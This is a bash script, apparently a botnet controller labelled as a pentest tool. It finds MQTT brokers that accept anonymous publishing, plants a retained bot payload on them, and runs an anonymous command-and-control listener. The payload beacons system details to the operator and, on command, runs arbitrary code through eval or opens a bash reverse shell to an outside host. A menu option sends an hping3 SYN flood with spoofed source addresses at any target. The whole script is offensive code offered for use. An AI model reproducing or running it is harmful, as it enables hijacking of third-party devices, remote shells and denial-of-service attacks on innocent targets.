#!/bin/bash
# TRUSTEDF57 v4.0 - FIXED VERSION (Pentest Mode)
# 🔧 Fix: TEST AUTH → Better payload → Stats realtime → DDoS anche con 0 active

clear
echo "🔥 TRUSTEDF57 v4.0 - PENTEST FIXED MODE"
echo "========================================="

# Config
C2_PORT=1883
HEARTBEAT_TOPIC="/firmware/status/+"
CMD_TOPIC="/sys/update/+/+"
LISTENER_PORT=1884  # Local listener separato

MY_IP=$(curl -s --max-time 3 ifconfig.me || curl -s icanhazip.com || hostname -I | awk '{print $1}' || echo "127.0.0.1")
echo "🌐 C2 IP: $MY_IP:$LISTENER_PORT"

BROKERS_VALID=0
BROKERS_INFECTED=0
ZOMBIES_ACTIVE=0
ZOMBIES_TOTAL=0

# Install + Setup C2 listener
setup_c2() {
    apt update -qq >/dev/null 2>&1
    apt install -yq mosquitto mosquitto-clients hping3 netcat-openbsd jq curl >/dev/null 2>&1
    
    # Config Mosquitto listener locale (no-auth)
    cat > /tmp/mosquitto_c2.conf << EOF
listener $LISTENER_PORT
allow_anonymous true
persistence false
log_type none
EOF
    
    mosquitto -c /tmp/mosquitto_c2.conf -d >/dev/null 2>&1 &
    sleep 2
    echo "✅ C2 listener: localhost:$LISTENER_PORT (no-auth)"
}

test_broker_auth() {
    local ip=$1
    # Test multiple topics + verbose check
    for topic in "/update/firmware" "/device/config" "/sys/maintenance" "/mqtt"; do
        if timeout 3 mosquitto_pub -h $ip -p 1883 -t "$topic" -m "test" >/dev/null 2>&1; then
            echo "$ip:1883 OK ($topic)"
            return 0
        fi
    done
    return 1
}

infect_broker() {
    local ip=$1
    local payload=$(cat << 'EOF'
#!/bin/bash
C2_HOST="${1:-127.0.0.1}"
LOOP_FILE="/tmp/.z${C2_HOST//./_}"
[[ -f $LOOP_FILE ]] && exit 0
touch "$LOOP_FILE"
while true; do
  # Heartbeat ogni 30s
  mosquitto_pub -h $C2_HOST -p 1884 -t "/firmware/status/alive" -m "$(whoami):$(nproc):$(uname -a)" >/dev/null 2>&1 || sleep 30
  # Listen commands
  mosquitto_sub -h $C2_HOST -p 1884 -t "/sys/update/#" -C 1 2>/dev/null | while IFS=' ' read topic cmd; do
    case $cmd in
      "kill") rm "$LOOP_FILE" && exit 0 ;;
      ddos:*) eval "${cmd#ddos:}" >/dev/null 2>&1 & ;;
      shell:*) bash -i >& /dev/tcp/${cmd#shell:} 0>&1 & ;;
      *) echo "Unknown: $cmd" ;;
    esac
  done || sleep 15
done
EOF
)
    payload=$(printf "$payload" "$MY_IP")
    
    # Publish su MULTI topic con RETAIN + idempotente
    for topic in "/update/firmware" "/device/config" "/sys/maintenance" "/mqtt/script"; do
        timeout 5 mosquitto_pub -h $ip -p 1883 -t "$topic" -m "$payload" --retain >/dev/null 2>&1 &
    done
    sleep 1
}

infect_all() {
    [[ ! -s brokers.txt ]] && { echo "❌ brokers.txt mancante!"; return 1; }
    
    echo "🧪 Testing auth su $(wc -l < brokers.txt) brokers..."
    > valid_brokers.txt
    
    # Parallel auth test (50 threads)
    cat brokers.txt | grep -oE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | sort -u | \
    xargs -n1 -P50 -I {} bash -c 'if test_broker_auth "{}"; then echo "{}:1883" >> valid_brokers.txt; fi'
    
    BROKERS_VALID=$(wc -l < valid_brokers.txt 2>/dev/null || echo 0)
    [[ $BROKERS_VALID -eq 0 ]] && { echo "❌ ZERO brokers no-auth!"; return 1; }
    
    echo "✅ $BROKERS_VALID brokers no-auth trovati!"
    
    # Infect solo validi (parallel 100)
    cat valid_brokers.txt | cut -d: -f1 | xargs -n1 -P100 infect_broker
    BROKERS_INFECTED=$BROKERS_VALID
    
    echo "🎉 Infected $BROKERS_INFECTED | Wait 1-3min per heartbeats..."
}

ddos_attack() {
    read -p "🎯 IP:PORT (es. 8.8.8.8:80): " target
    target=${target:-8.8.8.8:80}
    read -p "⏱️ Duration (sec): " duration
    duration=${duration:-60}
    
    # DDoS anche con pochi zombies (min 1)
    [[ $ZOMBIES_TOTAL -eq 0 ]] && echo "⚠️ No zombies yet, but sending anyway..."
    
    cmd="ddos:hping3 --flood -S -p${target#*:} -d 1200 --rand-source ${target%:*} & sleep $duration; killall hping3"
    echo "💥 DDoS → $target ($duration s) via $ZOMBIES_TOTAL zombies"
    
    mosquitto_pub -h localhost -p $LISTENER_PORT -t "$CMD_TOPIC" -m "$cmd"
    
    # Stop dopo duration
    (sleep $duration && mosquitto_pub -h localhost -p $LISTENER_PORT -t "$CMD_TOPIC" -m "kill" >/dev/null 2>&1 &) &
}

# Realtime listener (background)
mqtt_monitor() {
    mosquitto_sub -h localhost -p $LISTENER_PORT -t "$HEARTBEAT_TOPIC" \
        | while IFS=':' read -r _ user cpu info; do
            ZOMBIES_ACTIVE=$((ZOMBIES_ACTIVE + 1))
            ZOMBIES_TOTAL=$((ZOMBIES_TOTAL + 1))
            echo "✅ [$ZOMBIES_ACTIVE] New zombie: $user ($cpu CPU) - $info"
        done &
}

show_menu() {
    clear
    echo "🔥 TRUSTEDF57 v4.0 - PENTEST C2"
    echo "   C2: $MY_IP:$LISTENER_PORT"
    echo "================================"
    echo "📊 Brokers.txt: $(wc -l < brokers.txt 2>/dev/null || echo 0)"
    echo "   Valid no-auth: $BROKERS_VALID"
    echo "   Infected: $BROKERS_INFECTED"
    echo "   🧟 Zombies: $ZOMBIES_TOTAL active"
    echo ""
    echo "1) 🧪 TEST AUTH + INFECT"
    echo "2) 💥 DDoS ATTACK (works anche 0)"
    echo "3) 🧟 STATUS + LISTEN"
    echo "4) 🧹 CLEAN"
    echo "5) ❌ EXIT"
}

main() {
    setup_c2
    mqtt_monitor &
    
    while true; do
        show_menu
        read -p "► " choice
        
        case $choice in
            1) infect_all ;;
            2) ddos_attack ;;
            3) 
                echo "📡 Listening heartbeats... (Ctrl+C)"
                sleep 30
                ;;
            4) 
                mosquitto_pub -h localhost -p $LISTENER_PORT -t "$CMD_TOPIC" -m "kill"
                echo "🧹 Kill sent"
                ;;
            5) echo "👋"; pkill mosquitto; exit 0 ;;
            *) echo "❌ 1-5!" ;;
        esac
        read -p $'\n[ENTER]...'
    done
}

main "$@"
